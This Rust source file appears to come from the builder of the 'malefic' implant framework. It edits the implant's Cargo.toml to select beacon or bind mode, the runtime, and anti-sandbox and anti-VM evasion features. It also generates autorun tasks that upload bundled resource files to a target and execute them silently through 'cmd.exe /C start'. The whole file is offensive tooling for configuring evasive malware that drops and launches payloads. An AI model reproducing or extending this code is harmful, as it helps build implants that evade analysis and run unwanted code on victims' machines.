use crate::generate::config_prelude::{parse_yaml, update_prelude_spites};
use crate::{log_error, log_info, log_step, log_success};
use crate::{ImplantConfig, FEATURES};
use malefic_proto::proto::implantpb::spite::Body;
use malefic_proto::proto::implantpb::Spite;
use std::fs;
use std::path::Path;
use toml_edit::{Array, DocumentMut, Item};

const CONFIG_BEACON_TOML_PATH: &str = "malefic/Cargo.toml";

pub fn update_beacon_toml(implant_config: &ImplantConfig) {
    log_step!("Updating beacon Cargo.toml...");
    let cargo_toml_content = match fs::read_to_string(CONFIG_BEACON_TOML_PATH) {
        Ok(content) => content,
        Err(e) => {
            log_error!(
                "Failed to read Cargo.toml at {}: {}",
                CONFIG_BEACON_TOML_PATH,
                e
            );
            panic!("Failed to read Cargo.toml");
        }
    };

    let mut cargo_toml: DocumentMut = match cargo_toml_content.parse() {
        Ok(doc) => doc,
        Err(e) => {
            log_error!("Failed to parse Cargo.toml: {}", e);
            panic!("Failed to parse Cargo.toml");
        }
    };

    if let Some(features) = cargo_toml[&FEATURES].as_table_mut() {
        let default_array = Array::new();
        let mut updated_features = default_array;

        match implant_config.r#mod.as_str() {
            "beacon" => {
                updated_features.push("beacon".to_string());
            }
            "bind" => {
                updated_features.push("bind".to_string());
            }
            _ => {}
        }

        match implant_config.runtime.as_str() {
            "smol" => {
                updated_features.push("runtime_smol".to_string());
            }
            "tokio" => {
                updated_features.push("runtime_tokio".to_string());
            }
            "async-std" => {
                updated_features.push("runtime-asyncstd".to_string());
            }
            _ => {
                updated_features.push("runtime_tokio".to_string());
            }
        }

        let has_pack = implant_config
            .pack
            .as_ref()
            .map_or(false, |p| !p.is_empty());
        if has_pack || !implant_config.autorun.is_empty() {
            updated_features.push("malefic-prelude".to_string());
        }

        // Add anti features based on config
        if let Some(anti_config) = &implant_config.anti {
            if anti_config.sandbox {
                updated_features.push("anti_sandbox".to_string());
            }
            if anti_config.vm {
                updated_features.push("anti_vm".to_string());
            }
        }

        features["default"] = Item::Value(updated_features.into());
    } else {
        log_error!("Failed to find 'features' in Cargo.toml");
        panic!("Failed to find 'features' in Cargo.toml");
    }

    if let Err(e) = fs::write(CONFIG_BEACON_TOML_PATH, cargo_toml.to_string()) {
        log_error!("Failed to write Cargo.toml: {}", e);
        panic!("Failed to write Cargo.toml");
    }

    log_success!(
        "Beacon Cargo.toml has been updated at {}",
        CONFIG_BEACON_TOML_PATH
    );
}

pub fn update_malefic_spites(implant_config: &ImplantConfig, key: &str) -> anyhow::Result<()> {
    log_step!("Generating malefic spites...");

    let mut spites = if !implant_config.autorun.is_empty() {
        log_info!(
            "Loading autorun configuration from {}",
            implant_config.autorun
        );
        let autorun_yaml = std::fs::read_to_string(&implant_config.autorun)?;
        parse_yaml(&autorun_yaml)
    } else {
        Vec::new()
    };

    if let Some(pack_resources) = &implant_config.pack {
        for pack in pack_resources {
            if Path::new("./resources").join(&pack.src).exists() {
                let upload_request =
                    Body::UploadRequest(malefic_proto::proto::modulepb::UploadRequest {
                        name: "".to_string(),
                        r#priv: 0o644,
                        hidden: false,
                        r#override: false,
                        target: pack.dst.clone(),
                        data: fs::read(Path::new("./resources").join(&pack.src))
                            .expect("Failed to read resource file"),
                    });
                spites.push(Spite {
                    name: "upload".to_string(),
                    task_id: 0,
                    r#async: false,
                    timeout: 0,
                    error: 0,
                    status: None,
                    body: Some(upload_request),
                });

                let exec_request = Body::ExecRequest(malefic_proto::proto::modulepb::ExecRequest {
                    path: "cmd.exe".to_string(),
                    ppid: 0,
                    args: vec![
                        "/C".to_string(),
                        "start".to_string(),
                        "".to_string(),
                        pack.dst.clone(),
                    ],
                    output: false,
                    singleton: true,
                    realtime: false,
                });
                spites.push(Spite {
                    name: "exec".to_string(),
                    task_id: 0,
                    r#async: false,
                    timeout: 0,
                    error: 0,
                    status: None,
                    body: Some(exec_request),
                });
            }
        }
    }

    update_prelude_spites(spites, "./resources", key, "spite.bin")?;
    log_success!("Malefic spites have been generated successfully");
    Ok(())
}
